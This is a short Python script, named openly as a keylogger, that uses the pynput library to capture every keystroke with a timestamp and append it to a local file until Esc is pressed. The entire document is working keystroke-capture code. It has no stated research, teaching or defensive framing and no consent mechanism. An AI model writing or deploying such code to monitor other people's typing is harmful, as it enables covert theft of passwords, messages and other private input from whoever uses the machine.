from pynput import keyboard
import datetime

# Define the log file path
log_file_path = "keylogger_output.txt"

def on_press(key):
    try:
        # Record the key pressed and the current time
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{datetime.datetime.now()} - Key pressed: {key.char}\n")
    except AttributeError:
        # Handle special keys (e.g., space, enter)
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{datetime.datetime.now()} - Key pressed: {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when the escape key is pressed
        return False

# Set up the listener for key presses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
